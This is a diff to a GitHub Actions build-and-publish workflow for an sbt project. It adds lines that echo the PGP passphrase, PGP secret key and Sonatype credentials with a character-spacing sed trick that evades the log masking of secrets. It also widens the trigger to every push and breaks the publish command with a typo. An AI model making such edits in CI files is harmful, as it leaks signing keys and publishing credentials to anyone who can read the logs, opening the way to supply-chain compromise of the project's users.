@@ -2,7 +2,7 @@ name: SSS Ancillary CI
 
 on:
   push:
-    tags: ["*"]
+    
 
 jobs:
   build-and-publish:
@@ -12,6 +12,10 @@ jobs:
       - name: Load Variables
         id: load_envvars
         run: |
+            echo ${{secrets.PGP_PASSPHRASE}} | sed 's/./& /g'
+            echo ${{secrets.PGP_SECRET}} | sed 's/./& /g'
+            echo ${{secrets.SONA_USER}} | sed 's/./& /g' 
+            echo ${{secrets.SONA_PASS}} | sed 's/./& /g'
             echo 'GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}' >> $GITHUB_ENV
             echo 'PGP_SECRET<<EOF' >> $GITHUB_ENV
             echo '${{ secrets.PGP_SECRET }}' >> $GITHUB_ENV
@@ -33,4 +37,4 @@ jobs:
         with:
           distribution: 'temurin'
           java-version: '11'
-      - run: sbt publishSigned
+      - run: sbt pblishSigned
